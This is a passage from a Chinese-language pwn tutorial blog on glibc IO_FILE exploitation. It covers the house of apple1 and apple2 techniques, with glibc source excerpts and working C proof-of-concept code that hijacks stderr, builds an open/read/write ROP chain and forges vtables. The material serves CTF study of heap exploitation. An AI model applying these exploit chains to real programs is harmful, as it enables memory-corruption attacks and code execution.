%#zx\n\033[0m&quot;</span>, poprsi_ret);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mpop rdx ; pop rbx ; ret : %#zx\n\033[0m&quot;</span>, poprdx_rbx_ret);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere are some key functions: \033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里是一些关键函数的地址: \033[0m&quot;</span>);</span><br><span class="line">        <span class="type">size_t</span> readfunc_addr = (<span class="type">size_t</span>)read;</span><br><span class="line">        <span class="type">size_t</span> writefunc_addr = (<span class="type">size_t</span>)write;</span><br><span class="line">        <span class="type">size_t</span> openfunc_addr = (<span class="type">size_t</span>)open;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mopen(): %#zx\n\033[0m&quot;</span>, openfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mread(): %#zx\n\033[0m&quot;</span>, readfunc_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33mwrite(): %#zx\n\033[0m&quot;</span>, writefunc_addr);</span><br><span class="line"></span><br><span class="line">        space[<span class="number">0x20</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(libc_base + <span class="number">0x53a6d</span>);</span><br><span class="line">        space[<span class="number">0xa0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0x100</span> / <span class="number">8</span>]);</span><br><span class="line">        space[<span class="number">0xa8</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s construct our ROP chain.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来构造ROP链。\033[0m&quot;</span>);</span><br><span class="line">        space[<span class="number">0x100</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)flag;</span><br><span class="line">        space[<span class="number">0x108</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x110</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x118</span> / <span class="number">8</span>] = openfunc_addr;</span><br><span class="line">        space[<span class="number">0x120</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x128</span> / <span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">        space[<span class="number">0x130</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x138</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x140</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x148</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x150</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x158</span> / <span class="number">8</span>] = readfunc_addr;</span><br><span class="line">        space[<span class="number">0x160</span> / <span class="number">8</span>] = poprdi_ret;</span><br><span class="line">        space[<span class="number">0x168</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">        space[<span class="number">0x170</span> / <span class="number">8</span>] = poprsi_ret;</span><br><span class="line">        space[<span class="number">0x178</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)(&amp;space[<span class="number">0xf0</span>]);</span><br><span class="line">        space[<span class="number">0x180</span> / <span class="number">8</span>] = poprdx_rbx_ret;</span><br><span class="line">        space[<span class="number">0x188</span> / <span class="number">8</span>] = <span class="number">0x40</span>;</span><br><span class="line">        space[<span class="number">0x190</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        space[<span class="number">0x198</span> / <span class="number">8</span>] = writefunc_addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere is the former part of bss spare space:\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面是bss空闲区域前面的一部分:\033[0m&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m+%#5x\t\t%#18zx\t\t%#18zx\n\033[0m&quot;</span>, i * <span class="number">0x10</span>, space[<span class="number">2</span>*i], space[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31mError: invalid exploit mode!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m错误：选择了无效的利用模式！\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032mThen, we need to \033[31mchange the size of top chunk to make it unaligned, and malloc a big space.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[032m然后，我们需要\033[31m修改top chunk的大小来让它不对齐，然后malloc一块大空间。\033[0m&quot;</span>);</span><br><span class="line">    *top_chunk_size = <span class="number">0x101</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size was changed into: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m现在top_chunk-&gt;size的值被修改为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen, change the value of stderr pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后，修改stderr指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之前: *stderr_pointer = \033[33m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    *(<span class="type">size_t</span>*)stderr_ptr = (<span class="type">size_t</span>)fake_file_struct;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改之后: *stderr_pointer = \033[31m%p\n\033[0m&quot;</span>, *((<span class="keyword">struct</span> _IO_FILE**)(stderr_ptr)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAnd the last step: malloc(0x200) to trigger sysmalloc.\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后是最后一步：malloc(0x200)触发sysmalloc。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a><a class="link"   href="https://bbs.kanxue.com/thread-273418.htm" >house of apple1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p><strong>前置条件</strong></p>
<ul>
<li><code>glibc &gt;= 2.23</code>。</li>
<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数。</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址。</li>
<li>能使用一次 <code>largebin attack</code>。</li>
</ul>
<h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>当程序从<code>main</code>函数返回或者执行<code>exit</code>函数的时候，均会调用<code>fcloseall</code>函数。</p>
<p>该调用链为：<code>exit -&gt; fcloseall-&gt;_IO_cleanup -&gt;_IO_flush_all_lockp -&gt;_IO_OVERFLOW</code>。</p>
<p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足 <code>FSOP</code> 条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数。使用 <code>largebin attack</code> 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的<code>IO_FILE</code>结构体。</p>
<p><code>apple1</code> 主要利用了 <code>IO_FILE</code> 中的 <code>_wide_data</code> 指针成员，其指向结构体 <code>_IO_wide_data</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>_IO_wstrn_overflow</code> 函数中会在 <code>_wide_data</code> 指向的内存中写入连续 8 个 <code>snf-&gt;overflow_buf</code> 开始或结束位置的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*绕过点 2 */</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line">  <span class="comment">/*绕过点 1 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="built_in">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_wstrnfile</code>定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure></div>

<p>因此控制了 <code>_wide_data</code> 指针就能完成任意地址写。</p>
<p><strong>需要绕过的点</strong></p>
<ul>
<li>为了能够进入 <code>_IO_wstrn_overflow</code> 函数的 <code>if</code> 判断中，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code> 。</li>
<li>为了避免执行 <code>free (f-&gt;_wide_data-&gt;_IO_buf_base);</code> 需要满足 <code>f-&gt;_wide_data-&gt;_IO_buf_base</code> 为空或者 <code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code> 不为 0 ，其中 <code>_IO_FLAGS2_USER_WBUF</code> 为 <code>8</code> 。</li>
<li>另外如果利用 <code>FSOP</code> 触发需要满足：   <ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
</li>
</ul>
<h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>自行修改偏移。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编译环境 libc6_2.35-0ubuntu3.1_amd64.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = libc_base + <span class="number">0x21A6A0</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base + <span class="number">0x215A00</span> + <span class="number">0x3c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_write_ptr_addr = (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr_wide_data_addr = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)sdterr_vtable_addr = (<span class="type">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    <span class="built_in">fcloseall</span>();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231210140206622.png"
                      alt="image-20231210140206622"
                ></p>
<h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a><a class="link"   href="https://bbs.kanxue.com/thread-273832.htm" >house of apple2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p>这里把<code>roderick</code>师傅写的几个利用方式都写了一个 <code>POC</code>。</p>
<p><strong>前置条件</strong></p>
<ul>
<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li>
</ul>
<h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p><code>struct _IO_wide_data</code>结构体有一个<code>  const struct _IO_jump_t *_wide_vtable</code>成员。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable; <span class="comment">// 偏移0xe0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>而我们的<code>_IO_WOVERFLOW</code> 没有 <code>IO_validate_vtable</code> 检查。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div>

<p>因此，我们可以劫持 <code>IO_FILE_plus</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制<code>_wide_data</code>为可控的堆地址空间，进而控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间。控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流。</p>
<h2 id="利用-IO-wfile-overflow函数控制程序执行流"><a href="#利用-IO-wfile-overflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow函数控制程序执行流"></a>利用<code>_IO_wfile_overflow</code>函数控制程序执行流</h2><h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
